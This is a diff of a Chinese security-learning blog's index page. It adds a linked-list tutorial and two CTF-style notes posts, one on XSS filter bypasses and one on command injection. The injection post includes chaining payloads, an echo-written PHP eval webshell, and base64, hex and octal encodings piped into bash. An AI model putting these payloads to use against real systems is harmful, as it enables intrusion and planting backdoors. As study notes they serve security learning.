@@ -7,7 +7,305 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">78</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%9C%A8kali-linux%E4%B8%8B%E6%90%AD%E5%BB%BADVWA/">在kali-linux下搭建DVWA</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/linux/">linux</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/%E6%9D%82%E4%B8%83%E6%9D%82%E5%85%AB/">杂七杂八</a><span class="article-meta__link">-</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/DVWA/">DVWA</a></span><div class="content"><p>因为平台不同有些操作也有区别，所以今天想要在kali-linux搭建一下DVWA平台，当然还是遇到了一些困难，网上的解决方法也是有好有坏。所以我来总结下：</p>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">81</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/04/30/%E9%93%BE%E8%A1%A8/">链表</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-04-30</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95%E4%B9%8B%E7%BE%8E/">数据结构与算法之美</a></span><div class="content"><h1 id="数组和链表的区别"><a href="#数组和链表的区别" class="headerlink" title="数组和链表的区别"></a>数组和链表的区别</h1><table>
+<thead>
+<tr>
+<th></th>
+<th>数组</th>
+<th>链表</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>内存存储空间</td>
+<td>需要<strong>连续</strong>的内存空间来存储</td>
+<td>通过指针将一组<strong>零散</strong>的内存块串联使用</td>
+</tr>
+<tr>
+<td>插入、删除数据</td>
+<td><strong>缺：</strong>为了保持数据连续性，要做大量数据搬移。时间复杂度为：<strong>O(n)</strong></td>
+<td><strong>优：</strong>只需考虑相邻结点的指针改变。时间复杂度为：<strong>O(1)</strong></td>
+</tr>
+<tr>
+<td>访问</td>
+<td><strong>优：</strong>可以<strong>随机访问</strong>第k个元素。时间复杂度为：<strong>O(1)</strong></td>
+<td><strong>缺：</strong>要<strong>遍历</strong>结点来找到目标结点。时间复杂度为：<strong>O(n)</strong></td>
+</tr>
+<tr>
+<td>CPU缓存机制</td>
+<td><strong>优：</strong>因为数组是连续的内存空间，可以借助CPU缓存机制，预读数组中的数据，<strong>访问数据效率更高</strong>。</td>
+<td><strong>缺：</strong>不可以借助CPU缓存机制</td>
+</tr>
+<tr>
+<td>大小固定</td>
+<td><strong>缺：</strong>大小<strong>固定</strong>，改变大小需要将原来所有数据再复制过去，非常费时。</td>
+<td><strong>优：</strong>支持动态扩容。</td>
+</tr>
+</tbody></table>
+<blockquote>
+<p>对于CPU缓存机制【转】</p>
+<p>CPU在从内存读取数据的时候，会先把读取到的数据加载到CPU的缓存中。而CPU每次从内存读取数据并不是只读取那个特定要访问的地址，而是读取一个<strong>数据块</strong>(这个大小我不太确定。。)并保存到CPU缓存中，然后下次访问内存数据的时候就会先从CPU缓存开始查找，如果找到就不需要再从内存中取。这样就实现了比内存访问速度更快的机制，也就是CPU缓存存在的意义:为了弥补内存访问速度过慢与CPU执行速度快之间的差异而引入。</p>
+<p>对于数组来说，存储空间是连续的，所以在加载某个下标的时候可以把以后的几个下标元素也加载到CPU缓存这样执行速度会快于存储空间不连续的链表存储。</p>
+</blockquote>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/7.jpg" alt="7"></p>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/5.jpg" alt="5"></p>
+<h1 id="几种链表"><a href="#几种链表" class="headerlink" title="几种链表"></a>几种链表</h1><h2 id="单链表"><a href="#单链表" class="headerlink" title="单链表"></a>单链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/6.jpg" alt="6"></p>
+<p>头结点用来记录链表的基地址，尾结点指向一个空地址NULL</p>
+<h2 id="循环链表"><a href="#循环链表" class="headerlink" title="循环链表"></a>循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/4.jpg" alt="4"></p>
+<p>循环链表的尾结点指向链表的头结点</p>
+<h3 id="优点："><a href="#优点：" class="headerlink" title="优点："></a><strong>优点：</strong></h3><p>适合处理具有环形结构的数据</p>
+<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4><p>约瑟夫问题</p>
+<h2 id="双向链表"><a href="#双向链表" class="headerlink" title="双向链表"></a>双向链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/3.jpg" alt="3"></p>
+<p>比单链表多了一个prev前驱节点</p>
+<p><strong>优点：</strong>支持双向遍历</p>
+<p><strong>缺点：</strong>占用过多内存空间</p>
+<blockquote>
+<p>双向链表采用了<strong>用空间换时间</strong>的策略</p>
+</blockquote>
+<h3 id="例子-1"><a href="#例子-1" class="headerlink" title="例子"></a>例子</h3><h4 id="链表中的删除操作"><a href="#链表中的删除操作" class="headerlink" title="链表中的删除操作"></a>链表中的删除操作</h4><h5 id="删除结点中“值等于某个给定值”的结点"><a href="#删除结点中“值等于某个给定值”的结点" class="headerlink" title="删除结点中“值等于某个给定值”的结点"></a>删除结点中“值等于某个给定值”的结点</h5><p>单链表和双向链表都要遍历，时间复杂度均为：O(n)。</p>
+<h5 id="删除给定指针指向的结点"><a href="#删除给定指针指向的结点" class="headerlink" title="删除给定指针指向的结点"></a>删除给定指针指向的结点</h5><p>单链表：找到了要删除的结点，但不支持访问前驱节点，又要从头遍历，直到p-&gt;next=q 。时间复杂度：O(n)。</p>
+<p>双向链表：找到了要删除的结点，直接用前驱节点删除。时间复杂度：O(1)。</p>
+<h4 id="链表中的查询操作【对于有序链表】"><a href="#链表中的查询操作【对于有序链表】" class="headerlink" title="链表中的查询操作【对于有序链表】"></a>链表中的查询操作【对于有序链表】</h4><p>双向链表可以通过数据的大小决定往前还是往后查询，省去一半的时间。</p>
+<h2 id="双向循环链表"><a href="#双向循环链表" class="headerlink" title="双向循环链表"></a>双向循环链表</h2><p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/2.jpg" alt="2"></p>
+<h1 id="链表的实际应用场景"><a href="#链表的实际应用场景" class="headerlink" title="链表的实际应用场景"></a>链表的实际应用场景</h1><p>几种缓存淘汰机制</p>
+<ol>
+<li>先进先出【FIFO：First In，First Out】</li>
+<li>最少使用策略【LFU：Least Frequently Used】</li>
+<li>最近最少使用策略【LRU：Least Recently Used】</li>
+</ol>
+<h2 id="LRU缓存淘汰算法【转】"><a href="#LRU缓存淘汰算法【转】" class="headerlink" title="LRU缓存淘汰算法【转】"></a>LRU缓存淘汰算法【转】</h2><p>如何基于链表实现 LRU 缓存淘汰算法？</p>
+<p>我的思路是这样的：我们维护一个有序单链表，越靠近链表尾部的结点是越早之前访问的【老数据】。当有一个新的数据被访问时，我们从链表头开始顺序遍历链表。</p>
+<ol>
+<li>如果此数据之前已经被缓存在链表中了，我们遍历得到这个数据对应的结点，并将其从原来的位置删除，然后再插入到链表的头部。</li>
+<li>如果此数据没有在缓存链表中，又可以分为两种情况：</li>
+</ol>
+<p>如果此时缓存未满，则将此结点直接插入到链表的头部；</p>
+<p>如果此时缓存已满，则链表尾结点删除，将新的数据结点插入链表的头部。</p>
+<p>这样我们就用链表实现了一个 LRU 缓存，是不是很简单？</p>
+<p>现在我们来看下缓存访问的时间复杂度是多少。因为不管缓存有没有满，我们都需要遍历一遍链表，所以这种基于链表的实现思路，缓存访问的时间复杂度为 O(n)。</p>
+<p>实际上，我们可以继续优化这个实现思路，比如引入散列表（Hash table）来记录每个数据的位置，将缓存访问的时间复杂度降到 O(1)。因为要涉及我们还没有讲到的数据结构，所以这个优化方案，我现在就不详细说了，等讲到散列表的时候，我会再拿出来讲。</p>
+<h1 id="链表代码的书写技巧"><a href="#链表代码的书写技巧" class="headerlink" title="链表代码的书写技巧"></a>链表代码的书写技巧</h1><h2 id="警惕指针丢失和内存泄漏"><a href="#警惕指针丢失和内存泄漏" class="headerlink" title="警惕指针丢失和内存泄漏"></a>警惕指针丢失和内存泄漏</h2><p>错误样例</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;next=x;</span><br><span class="line">x-&gt;next=p-&gt;next;<span class="comment">//这句相当于把x的值赋给x</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="利用哨兵简化实现难度"><a href="#利用哨兵简化实现难度" class="headerlink" title="利用哨兵简化实现难度"></a>利用哨兵简化实现难度</h2><h3 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h3><p>如果要在p结点后面插入一个新的结点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">new_node -&gt; next = p -&gt; next;</span><br><span class="line">p -&gt; next = new_node;</span><br></pre></td></tr></table></figure>
+
+<p>特殊情况：向空链表插入第一个结点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(head==null)&#123;</span><br><span class="line">    head = new_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h3><p>单链表的结点删除操作</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;next = p-&gt;next-&gt;next;</span><br></pre></td></tr></table></figure>
+
+<p>特殊情况：删除最后一个结点</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(head-&gt;next==null)&#123;</span><br><span class="line">    head = null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="简化"><a href="#简化" class="headerlink" title="简化"></a>简化</h3><p>可以看出，无论是插入还是删除都需要考虑特殊情况，比较麻烦。</p>
+<p>这是可以考虑引入<strong>哨兵</strong>。</p>
+<p><img src="/2020/04/30/%E9%93%BE%E8%A1%A8/8.jpg" alt="8"></p>
+<p>我们让head一直指向这个哨兵结点，哨兵结点内不存储任何数据，我们把这种链表称为<strong>带头链表</strong>。</p>
+<p>在这种情况下，我们插入、删除都可以利用上面的一般表达式。</p>
+<h2 id="重点留意边界条件处理"><a href="#重点留意边界条件处理" class="headerlink" title="重点留意边界条件处理"></a>重点留意边界条件处理</h2><ol>
+<li>如果链表为空</li>
+<li>如果链表只包含一个结点</li>
+<li>如果链表只包含两个结点</li>
+<li>代码逻辑在处理头结点和尾结点时</li>
+</ol>
+<h2 id="多写多练"><a href="#多写多练" class="headerlink" title="多写多练"></a>多写多练</h2><ul>
+<li>单链表反转</li>
+<li>链表中环的检测</li>
+<li>两个有序链表的合并</li>
+<li>删除链表倒数第n个结点</li>
+<li>求链表的中间结点</li>
+</ul>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/19/XSS/">XSS</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-19</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><div class="content"><h3 id="XSS绕过过滤"><a href="#XSS绕过过滤" class="headerlink" title="XSS绕过过滤"></a>XSS绕过过滤</h3><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>如果过滤()和[]，则</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alert&#96;1&#96;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="html实体字符及"><a href="#html实体字符及" class="headerlink" title="html实体字符及"></a>html实体字符及<svg/></h4><p>如果过滤()、[]和``</p>
+<p>则可以使用html实体字符代替括号</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg&gt;&lt;script&gt;alert &amp;#40; 1 &amp;#41;&lt;&#x2F;script&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;x&quot; onerror&#x3D;&quot;alert &amp;#40; 1 &amp;#41;&quot;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>第一个必须要加<svg>标签，第二个可不加（我寻思可能是第一个不在标签里面）。</svg></p>
+<h4 id="闭合注释"><a href="#闭合注释" class="headerlink" title="闭合注释"></a>闭合注释</h4><p>闭合注释</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--   --&gt;</span><br><span class="line">&lt;!--   --!&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="换行过滤"><a href="#换行过滤" class="headerlink" title="换行过滤"></a>换行过滤</h4><p>对于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  input &#x3D; input.replace(&#x2F;auto|on.*&#x3D;|&gt;&#x2F;ig, &#39;_&#39;)</span><br><span class="line">  return &#96;&lt;input value&#x3D;1 $&#123;input&#125; type&#x3D;&quot;text&quot;&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可使用<strong>换行绕过</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">src&#x3D;1 type&#x3D;image onerror</span><br><span class="line">&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="浏览器兼容性"><a href="#浏览器兼容性" class="headerlink" title="浏览器兼容性"></a>浏览器兼容性</h4><p>对于</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function render (input) &#123;</span><br><span class="line">  const stripTagsRe &#x3D; &#x2F;&lt;\&#x2F;?[^&gt;]+&gt;&#x2F;gi</span><br><span class="line"></span><br><span class="line">  input &#x3D; input.replace(stripTagsRe, &#39;&#39;)</span><br><span class="line">  return &#96;&lt;article&gt;$&#123;input&#125;&lt;&#x2F;article&gt;&#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>可利用浏览器的兼容性直接输入未闭合标签</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;1 onerror&#x3D;&quot;alert(1)&quot;</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>留一个没有解决的小问题，为什么此题不能用换行绕过？</p>
+<p>我猜是因为const的缘故？</p>
+</blockquote>
+<h4 id="style闭合"><a href="#style闭合" class="headerlink" title="style闭合"></a>style闭合</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function render (src) &#123;</span><br><span class="line">  src &#x3D; src.replace(&#x2F;&lt;\&#x2F;style&gt;&#x2F;ig, &#39;&#x2F;* \u574F\u4EBA *&#x2F;&#39;)</span><br><span class="line">  return &#96;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">      $&#123;src&#125;</span><br><span class="line">    &lt;&#x2F;style&gt;</span><br><span class="line">  &#96;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我先试了下老书上的方法</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;style&gt;BODY&#123;background:url(&quot;javascript:alert(1)&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>
+
+<p>失败了。</p>
+<p>于是</p>
+<ol>
+<li><p>   多一个空格</p>
+</li>
+<li><pre><code>&lt;/style
+&gt;</code></pre><blockquote>
+<p>不知道为啥这里又可以换行了</p>
+</blockquote>
+</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/02/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/">命令执行/代码执行</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-02</time><span class="article-meta"><span class="article-meta__separator">|</span><i class="fa fa-inbox article-meta__icon" aria-hidden="true"></i><a class="article-meta__categories" href="/categories/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/">web安全漏洞</a></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/ctfhub/">ctfhub</a></span><div class="content"><h2 id="一些基本概念"><a href="#一些基本概念" class="headerlink" title="一些基本概念"></a>一些基本概念</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h3><ul>
+<li><p><strong>command1 &amp; command2 ：</strong></p>
+<p>不管command1执行成功与否，都会执行command2</p>
+</li>
+<li><p><strong>command1 &amp;&amp; command2 ：</strong></p>
+<p>先执行command1执行成功后才会执行command2</p>
+</li>
+<li><p><strong>command1 | command2 ：</strong></p>
+<p>只执行command2（将上一个命令的输出作为下一个命令的输入）</p>
+</li>
+<li><p><strong>command1 || command2 ：</strong></p>
+<p>command1执行失败，再执行command2(若command1执行成功，就不再执行command2)</p>
+</li>
+</ul>
+<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><ul>
+<li><p>;   前面的执行完执行后面的    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>|   管道符，显示后面的执行结果  ，（将上一个命令的输出作为下一个命令的输入）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1|whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>||  当前面的执行出错时执行后面的  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 1||whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;  前面的语句为假则直接执行后面的,前面可真可假           </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;whoami</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>&amp;&amp;前面的语句为假则直接出错，后面的也不执行，前面只能为真   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping 127.0.0.1&amp;&amp;whoami</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<blockquote>
+<p><strong>常用url编码</strong> ：<br>%20 = 空格<br>%5c = <br>%26 = &amp;<br>%7c = |</p>
+<p>%0a=换行</p>
+<p>%3b=;</p>
+</blockquote>
+<h2 id="代码执行漏洞和命令执行漏洞"><a href="#代码执行漏洞和命令执行漏洞" class="headerlink" title="代码执行漏洞和命令执行漏洞"></a>代码执行漏洞和命令执行漏洞</h2><h3 id="代码执行漏洞"><a href="#代码执行漏洞" class="headerlink" title="代码执行漏洞"></a>代码执行漏洞</h3><p>类似ecal(),assert()函数</p>
+<h3 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h3><p>类似exec(),system()</p>
+<h2 id="几种bypass"><a href="#几种bypass" class="headerlink" title="几种bypass"></a>几种bypass</h2><h3 id="基本的注入"><a href="#基本的注入" class="headerlink" title="基本的注入"></a>基本的注入</h3><ul>
+<li><pre><code>127.0.0.1;ls
+127.0.0.1;cat xxx.txt
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+127.0.0.1;echo &quot;&lt;?php @eval(\$_POST[&apos;key&apos;]);?&gt;&quot; &gt;xxx.php
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  \$用来转义，有时echo会用到-e参数</span><br><span class="line"></span><br><span class="line">  [有关-e、-n参数。](https:&#x2F;&#x2F;www.cnblogs.com&#x2F;karl-python&#x2F;p&#x2F;9261920.html)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### base64编码</span><br><span class="line"></span><br><span class="line">有时有些内容无法回显,我们可以base64编码它们</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+1;cat xxx.txt &amp; base64
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  &amp;的作用是把前面输出的结果作为输入进行后面的操作</span><br><span class="line"></span><br><span class="line">-</span><br></pre></td></tr></table></figure>
+1;base64 xxx.txt
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤cat</span><br><span class="line"></span><br><span class="line">- 反斜杠 ： 例如</span><br></pre></td></tr></table></figure>
+ca\t fl\ag.php
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">- 连接符： 例如</span><br></pre></td></tr></table></figure>
+ca&apos;&apos;t fla&apos;&apos;g.txt
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤空格</span><br><span class="line"></span><br><span class="line">在 bash 下, 可以用以下字符代替空格：</span><br></pre></td></tr></table></figure>
+&lt;,&lt;&gt;,%20(space),%09(tab),$IFS$9, ${IFS},$IFS 等
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 过滤目录分隔符[&#x2F;]</span><br><span class="line"></span><br><span class="line">可以使用cd命令直接进入那个目录</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">### 花括号</span><br><span class="line"></span><br><span class="line">&#123;cat,flag&#125; 逗号代替空格</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; ### 黑名单绕过</span><br><span class="line">&gt;</span><br><span class="line">&gt; 拼接绕过:相当于ls</span><br><span class="line">&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+&gt; $a=l;$b=s;$a$b
+&gt; <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">编码绕过：</span><br><span class="line"></span><br><span class="line">**base64：**</span><br><span class="line"></span><br><span class="line">&#96;&#96;&#96;bash</span><br><span class="line">echo MTIzCg&#x3D;&#x3D;|base64 -d 其将会打印123</span><br><span class="line">echo &quot;Y2F0IC9mbGFn&quot;|base64 -d|bash &#x3D;&#x3D;&gt;cat &#x2F;flag</span><br></pre></td></tr></table></figure>
+&gt;
+&gt; **hex:**
+&gt;
+&gt; <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="string">"636174202f666c6167"</span> | xxd -r -p|bash ==&gt;cat /flag</span><br></pre></td></tr></table></figure>
+&gt;
+&gt; **oct：**
+&gt;
+&gt; <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="built_in">printf</span> <span class="string">"\154\163"</span>) ==&gt;ls</span><br><span class="line">$(<span class="built_in">printf</span> <span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>) ==&gt;cat /flag</span><br><span class="line">&#123;<span class="built_in">printf</span>,<span class="string">"\x63\x61\x74\x20\x2f\x66\x6c\x61\x67"</span>&#125;|\<span class="variable">$0</span> ==&gt;cat /flag</span><br><span class="line"><span class="comment">#可以通过这样来写webshell,内容为&lt;?php @eval($_POST['c']);?&gt;</span></span><br><span class="line"><span class="variable">$&#123;printf,"\74\77\160\150\160\40\100\145\166\141\154\50\44\137\120\117\123\124\133\47\143\47\135\51\73\77\76"&#125;</span> &gt;&gt; 1.php</span><br></pre></td></tr></table></figure>
+
+
